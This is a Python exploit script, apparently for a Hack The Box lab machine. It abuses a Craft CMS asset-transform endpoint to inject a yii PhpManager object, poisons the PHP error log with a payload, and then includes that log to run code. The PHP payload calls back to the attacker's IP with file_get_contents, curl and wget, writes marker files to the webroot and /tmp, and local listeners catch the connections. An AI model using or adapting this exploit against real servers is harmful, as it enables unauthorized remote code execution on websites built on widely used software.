import socket, threading, time, requests, re, random

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}
MY_IP = '10.10.15.184'

def listen(port, timeout, label):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    s.settimeout(timeout)
    try:
        conn, addr = s.accept()
        data = conn.recv(1024)
        print(f'[{label}] CONNECTED from {addr}: {data}')
        conn.send(b'HTTP/1.0 200 OK\r\n\r\n')
        conn.close()
        return True
    except socket.timeout:
        print(f'[{label}] No connection after {timeout}s')
        return False
    finally:
        s.close()

# Start listeners on 3 ports
for port in [9991, 9992, 9993]:
    t = threading.Thread(target=listen, args=(port, 30, f'p{port}'), daemon=True)
    t.start()
time.sleep(0.5)

# Build PHP payload with multiple callback methods
uid = random.randint(10000, 99999)
print(f'UID: {uid}', flush=True)

# Methods:
# 1. file_get_contents (allow_url_fopen=On)
# 2. exec with curl
# 3. exec with wget
# 4. write to webroot
# 5. write to /tmp
# 6. sleep(3) timing test

php = '<?php '
php += '@file_get_contents("http://' + MY_IP + ':9991/fgc");'
php += '@exec("curl -s http://' + MY_IP + ':9992/exec >/dev/null 2>&1 &");'
php += '@exec("wget -q -O /dev/null http://' + MY_IP + ':9993/wget 2>/dev/null &");'
php += '@file_put_contents("/var/www/html/craft/web/M' + str(uid) + '.txt","OK");'
php += '@file_put_contents("/tmp/ORION' + str(uid) + '","OK");'
php += 'sleep(3);'
php += '?>'

inject_path = '/idontexist/' + php
print(f'Inject path length: {len(inject_path)}', flush=True)

def send_req(body):
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        print('  No CSRF', flush=True)
        return None
    csrf = m.group(1)
    headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=30)
    return r2, r2.elapsed.total_seconds()

# Step 1: inject
body1 = {'assetId': 11, 'handle': {'width': 1, 'height': 1, 'as session': {'class': 'yii\\rbac\\PhpManager', 'itemFile': inject_path}}}
print('Step 1: Inject...', end=' ', flush=True)
r1, t1 = send_req(body1)
print(f'{r1.status_code if r1 else "FAIL"} ({t1:.2f}s)', flush=True)

time.sleep(2)

# Step 2: include error_log (measure timing)
body2 = {'assetId': 11, 'handle': {'width': 1, 'height': 1, 'as session': {'class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/www/html/craft/storage/logs/phperrors.log'}}}
print('Step 2: Include error_log...', end=' ', flush=True)
r2, t2 = send_req(body2)
print(f'{r2.status_code if r2 else "FAIL"} ({t2:.2f}s)', flush=True)

# Control: Step 2 WITHOUT prior inject (baseline timing)
time.sleep(1)
print('Step 2b: Control (fresh error_log include)...', end=' ', flush=True)
r2b, t2b = send_req(body2)
print(f'{r2b.status_code if r2b else "FAIL"} ({t2b:.2f}s)', flush=True)

print('Waiting for callbacks...', flush=True)
time.sleep(20)

# Check for marker files
print(f'Checking web marker M{uid}.txt...', end=' ', flush=True)
r3 = requests.get(f'{HOST}/M{uid}.txt', headers=HEADERS, timeout=10)
print(f'{r3.status_code}', flush=True)
if r3.status_code == 200:
    print(f'  CONTENT: {r3.text}')
